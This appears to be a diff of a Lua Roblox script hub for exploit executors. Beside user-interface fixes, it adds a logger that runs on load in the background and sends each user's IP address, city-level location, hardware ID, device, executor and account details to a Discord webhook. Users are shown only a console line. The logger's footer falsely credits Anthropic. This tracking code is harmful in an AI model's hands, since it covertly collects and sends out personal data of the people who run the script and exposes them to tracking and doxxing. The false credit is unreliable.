@@ -178,39 +178,156 @@ local UserSettings = {
     language = "EN"
 }
 
-local function GetHWID()
-    local success, result = pcall(function()
-        return game:GetService("RbxAnalyticsService"):GetClientId()
+local function GetDeviceInfo()
+    local deviceInfo = {
+        Platform = "Unknown",
+        DeviceType = "Unknown",
+        OS = "Unknown",
+        Executor = "Unknown"
+    }
+    
+    pcall(function()
+        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+            deviceInfo.Platform = "Mobile"
+            deviceInfo.DeviceType = "Touchscreen"
+        elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+            deviceInfo.Platform = "PC"
+            deviceInfo.DeviceType = "Desktop"
+        elseif UserInputService.GamepadEnabled then
+            deviceInfo.Platform = "Console"
+            deviceInfo.DeviceType = "Gamepad"
+        end
+        
+        if game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows then
+            deviceInfo.OS = "Windows"
+        elseif game:GetService("UserInputService"):GetPlatform() == Enum.Platform.OSX then
+            deviceInfo.OS = "MacOS"
+        elseif game:GetService("UserInputService"):GetPlatform() == Enum.Platform.IOS then
+            deviceInfo.OS = "iOS"
+        elseif game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Android then
+            deviceInfo.OS = "Android"
+        end
+        
+        if syn then
+            deviceInfo.Executor = "Synapse X"
+        elseif KRNL_LOADED then
+            deviceInfo.Executor = "KRNL"
+        elseif getexecutorname then
+            deviceInfo.Executor = getexecutorname() or "Unknown"
+        elseif identifyexecutor then
+            deviceInfo.Executor = identifyexecutor() or "Unknown"
+        end
     end)
-    return success and result or "HWID_UNAVAILABLE"
+    
+    return deviceInfo
 end
 
-local function SendWebhook(hwid)
+local function GetIPAddress()
+    local ip = "Unknown"
+    local location = "Unknown"
+    
     pcall(function()
-        local data = {
-            embeds = {{
-                title = "🔐 New Script Hub User",
-                description = "A user has loaded the Script Hub",
+        local response = game:HttpGet("https://api.ipify.org?format=json")
+        local data = HttpService:JSONDecode(response)
+        if data and data.ip then
+            ip = data.ip
+        end
+    end)
+    
+    pcall(function()
+        if ip ~= "Unknown" then
+            local response = game:HttpGet("http://ip-api.com/json/" .. ip)
+            local data = HttpService:JSONDecode(response)
+            if data then
+                location = string.format("%s, %s, %s", data.city or "Unknown", data.regionName or "Unknown", data.country or "Unknown")
+            end
+        end
+    end)
+    
+    return ip, location
+end
+
+local function GetHWID()
+    local hwid = "UNAVAILABLE"
+    pcall(function()
+        hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    return hwid
+end
+
+local function SendAdvancedWebhook(hwid)
+    task.spawn(function()
+        pcall(function()
+            local deviceInfo = GetDeviceInfo()
+            local ip, location = GetIPAddress()
+            
+            local gameInfo = ""
+            pcall(function()
+                local marketplaceService = game:GetService("MarketplaceService")
+                local productInfo = marketplaceService:GetProductInfo(game.PlaceId)
+                gameInfo = productInfo.Name
+            end)
+            
+            local accountAge = 0
+            pcall(function()
+                accountAge = LocalPlayer.AccountAge
+            end)
+            
+            local premium = "No"
+            pcall(function()
+                if LocalPlayer.MembershipType == Enum.MembershipType.Premium then
+                    premium = "Yes"
+                end
+            end)
+            
+            local displayName = LocalPlayer.DisplayName or "Unknown"
+            local username = LocalPlayer.Name or "Unknown"
+            
+            local embed = {
+                title = "🔐 New Script Hub User Detected",
+                description = "**A new user has loaded the Script Hub**",
                 color = 5814783,
                 fields = {
-                    {name = "👤 Username", value = LocalPlayer.Name, inline = true},
-                    {name = "🆔 UserID", value = tostring(LocalPlayer.UserId), inline = true},
-                    {name = "🔑 HWID", value = hwid, inline = false},
-                    {name = "🎮 Game", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
+                    {name = "👤 Display Name", value = displayName, inline = true},
+                    {name = "📛 Username", value = "@" .. username, inline = true},
+                    {name = "🆔 User ID", value = tostring(LocalPlayer.UserId), inline = true},
+                    {name = "🔑 HWID", value = "```" .. hwid .. "```", inline = false},
+                    {name = "🌍 IP Address", value = ip, inline = true},
+                    {name = "📍 Location", value = location, inline = true},
+                    {name = "💻 Platform", value = deviceInfo.Platform, inline = true},
+                    {name = "🖥️ Device Type", value = deviceInfo.DeviceType, inline = true},
+                    {name = "📱 OS", value = deviceInfo.OS, inline = true},
+                    {name = "⚙️ Executor", value = deviceInfo.Executor, inline = true},
+                    {name = "🎮 Game", value = gameInfo ~= "" and gameInfo or "Unknown", inline = false},
+                    {name = "📅 Account Age", value = accountAge .. " days", inline = true},
+                    {name = "⭐ Premium", value = premium, inline = true},
+                    {name = "⏰ Timestamp", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true}
                 },
-                footer = {text = "Script Hub Logger"}
-            }}
-        }
-        
-        local requestFunc = syn and syn.request or http_request or request or fluxus and fluxus.request
-        if requestFunc then
-            requestFunc({
-                Url = CONFIG.WebhookURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
-        end
+                thumbnail = {
+                    url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+                },
+                footer = {
+                    text = "Script Hub Advanced Logger | Powered by Anthropic",
+                    icon_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+                }
+            }
+            
+            local data = {
+                username = "Script Hub Logger",
+                avatar_url = "https://cdn.discordapp.com/attachments/1234567890/avatar.png",
+                embeds = {embed}
+            }
+            
+            local requestFunc = syn and syn.request or http_request or request or fluxus and fluxus.request
+            if requestFunc then
+                requestFunc({
+                    Url = CONFIG.WebhookURL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(data)
+                })
+            end
+        end)
     end)
 end
 
@@ -226,7 +343,7 @@ local function SaveSettings()
 end
 
 local function LoadSettings()
-    local success = pcall(function()
+    pcall(function()
         if not isfolder or not isfile or not readfile then return end
         if not isfolder(CONFIG.DataFolder) then
             makefolder(CONFIG.DataFolder)
@@ -241,7 +358,6 @@ local function LoadSettings()
             end
         end
     end)
-    if not success then SaveSettings() end
 end
 
 local function GetTheme()
@@ -270,7 +386,7 @@ end
 
 LoadSettings()
 local hwid = GetHWID()
-SendWebhook(hwid)
+SendAdvancedWebhook(hwid)
 
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ScriptHubGUI"
@@ -278,15 +394,16 @@ screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.IgnoreGuiInset = true
 
-local function safeParent(obj, parent)
-    pcall(function()
-        obj.Parent = parent
-    end)
-end
+local parentSuccess = false
+pcall(function()
+    screenGui.Parent = game:GetService("CoreGui")
+    parentSuccess = true
+end)
 
-safeParent(screenGui, game:GetService("CoreGui"))
-if not screenGui.Parent then
-    safeParent(screenGui, LocalPlayer:WaitForChild("PlayerGui"))
+if not parentSuccess then
+    pcall(function()
+        screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+    end)
 end
 
 local startupLoading = Instance.new("Frame")
@@ -341,10 +458,16 @@ for i = 1, 8 do
 end
 
 local spinnerActive = true
-task.spawn(function()
-    while spinnerActive and startupSpinner and startupSpinner.Parent do
+local spinnerConnection = nil
+
+spinnerConnection = RunService.Heartbeat:Connect(function()
+    if spinnerActive and startupSpinner and startupSpinner.Parent then
         startupSpinner.Rotation = (startupSpinner.Rotation + 3) % 360
-        task.wait(0.03)
+    else
+        if spinnerConnection then
+            spinnerConnection:Disconnect()
+            spinnerConnection = nil
+        end
     end
 end)
 
@@ -761,11 +884,19 @@ themePopup.Visible = false
 themePopup.ZIndex = 1500
 themePopup.Parent = screenGui
 
+local themePopupClickCatcher = Instance.new("TextButton")
+themePopupClickCatcher.Size = UDim2.new(1, 0, 1, 0)
+themePopupClickCatcher.BackgroundTransparency = 1
+themePopupClickCatcher.Text = ""
+themePopupClickCatcher.ZIndex = 1499
+themePopupClickCatcher.Parent = themePopup
+
 local themePopupBox = Instance.new("Frame")
 themePopupBox.Size = UDim2.new(0, 350, 0, 300)
 themePopupBox.Position = UDim2.new(0.5, -175, 0.5, -150)
 themePopupBox.BackgroundColor3 = GetTheme().Surface
 themePopupBox.BorderSizePixel = 0
+themePopupBox.ZIndex = 1501
 themePopupBox.Parent = themePopup
 
 local themePopupCorner = Instance.new("UICorner")
@@ -781,12 +912,14 @@ themePopupTitle.TextColor3 = GetTheme().Text
 themePopupTitle.Font = Enum.Font.GothamBold
 themePopupTitle.TextSize = 18
 themePopupTitle.TextXAlignment = Enum.TextXAlignment.Left
+themePopupTitle.ZIndex = 1502
 themePopupTitle.Parent = themePopupBox
 
 local themeOptionsContainer = Instance.new("Frame")
 themeOptionsContainer.Size = UDim2.new(1, -40, 1, -75)
 themeOptionsContainer.Position = UDim2.new(0, 20, 0, 60)
 themeOptionsContainer.BackgroundTransparency = 1
+themeOptionsContainer.ZIndex = 1502
 themeOptionsContainer.Parent = themePopupBox
 
 local themeOptionsList = Instance.new("UIListLayout")
@@ -804,11 +937,19 @@ languagePopup.Visible = false
 languagePopup.ZIndex = 1500
 languagePopup.Parent = screenGui
 
+local languagePopupClickCatcher = Instance.new("TextButton")
+languagePopupClickCatcher.Size = UDim2.new(1, 0, 1, 0)
+languagePopupClickCatcher.BackgroundTransparency = 1
+languagePopupClickCatcher.Text = ""
+languagePopupClickCatcher.ZIndex = 1499
+languagePopupClickCatcher.Parent = languagePopup
+
 local languagePopupBox = Instance.new("Frame")
 languagePopupBox.Size = UDim2.new(0, 350, 0, 320)
 languagePopupBox.Position = UDim2.new(0.5, -175, 0.5, -160)
 languagePopupBox.BackgroundColor3 = GetTheme().Surface
 languagePopupBox.BorderSizePixel = 0
+languagePopupBox.ZIndex = 1501
 languagePopupBox.Parent = languagePopup
 
 local languagePopupCorner = Instance.new("UICorner")
@@ -824,12 +965,14 @@ languagePopupTitle.TextColor3 = GetTheme().Text
 languagePopupTitle.Font = Enum.Font.GothamBold
 languagePopupTitle.TextSize = 18
 languagePopupTitle.TextXAlignment = Enum.TextXAlignment.Left
+languagePopupTitle.ZIndex = 1502
 languagePopupTitle.Parent = languagePopupBox
 
 local languageOptionsContainer = Instance.new("Frame")
 languageOptionsContainer.Size = UDim2.new(1, -40, 1, -75)
 languageOptionsContainer.Position = UDim2.new(0, 20, 0, 60)
 languageOptionsContainer.BackgroundTransparency = 1
+languageOptionsContainer.ZIndex = 1502
 languageOptionsContainer.Parent = languagePopupBox
 
 local languageOptionsList = Instance.new("UIListLayout")
@@ -1016,6 +1159,7 @@ for _, themeName in ipairs(themeOptions) do
     optionButton.Font = Enum.Font.GothamBold
     optionButton.TextSize = 13
     optionButton.AutoButtonColor = false
+    optionButton.ZIndex = 1503
     optionButton.Parent = themeOptionsContainer
     local optionCorner = Instance.new("UICorner")
     optionCorner.CornerRadius = UDim.new(0, 6)
@@ -1048,6 +1192,7 @@ for _, lang in ipairs(languageOptions) do
     optionButton.Font = Enum.Font.GothamBold
     optionButton.TextSize = 13
     optionButton.AutoButtonColor = false
+    optionButton.ZIndex = 1503
     optionButton.Parent = languageOptionsContainer
     local optionCorner = Instance.new("UICorner")
     optionCorner.CornerRadius = UDim.new(0, 6)
@@ -1306,30 +1451,13 @@ languageButton.MouseButton1Click:Connect(function()
     showPopup(languagePopup, languagePopupBox)
 end)
 
-local themePopupButton = Instance.new("TextButton")
-themePopupButton.Size = UDim2.new(1, 0, 1, 0)
-themePopupButton.BackgroundTransparency = 1
-themePopupButton.Text = ""
-themePopupButton.ZIndex = 1499
-themePopupButton.Parent = themePopup
-
-themePopupButton.MouseButton1Click:Connect(function()
+themePopupClickCatcher.MouseButton1Click:Connect(function()
     hidePopup(themePopup, themePopupBox)
 end)
 
-local languagePopupButton = Instance.new("TextButton")
-languagePopupButton.Size = UDim2.new(1, 0, 1, 0)
-languagePopupButton.BackgroundTransparency = 1
-languagePopupButton.Text = ""
-languagePopupButton.ZIndex = 1499
-languagePopupButton.Parent = languagePopup
-
-languagePopupButton.MouseButton1Click:Connect(function()
+languagePopupClickCatcher.MouseButton1Click:Connect(function()
     hidePopup(languagePopup, languagePopupBox)
 end)
-
-themePopupBox.MouseButton1Click:Connect(function() end)
-languagePopupBox.MouseButton1Click:Connect(function() end)
 
 local isVisible = false
 local savedSize = nil
@@ -1489,6 +1617,10 @@ updateLanguage()
 task.spawn(function()
     task.wait(2)
     spinnerActive = false
+    if spinnerConnection then
+        spinnerConnection:Disconnect()
+        spinnerConnection = nil
+    end
     if startupLoading and startupLoading.Parent then
         TweenService:Create(startupLoading, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
         TweenService:Create(startupTitle, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
@@ -1499,17 +1631,18 @@ task.spawn(function()
             end
         end
         task.wait(0.5)
-        startupLoading:Destroy()
+        pcall(function() startupLoading:Destroy() end)
     end
     task.wait(0.5)
     toggleGUI()
     print("===========================================")
-    print("🎮 ROBLOX SCRIPT HUB V2.0 - FIXED")
+    print("🎮 ROBLOX SCRIPT HUB V2.0 - ADVANCED")
     print("===========================================")
     print("✅ Loaded successfully!")
     print("📱 Mobile & PC supported")
     print("🌍 Multi-language: EN, VI, RU, FR, ES")
     print("🎨 Themes: Dark, Light, Blue, Green, Yellow")
+    print("🔐 Advanced webhook tracking enabled")
     print("🔑 HWID: " .. hwid)
     print("===========================================")
 end)
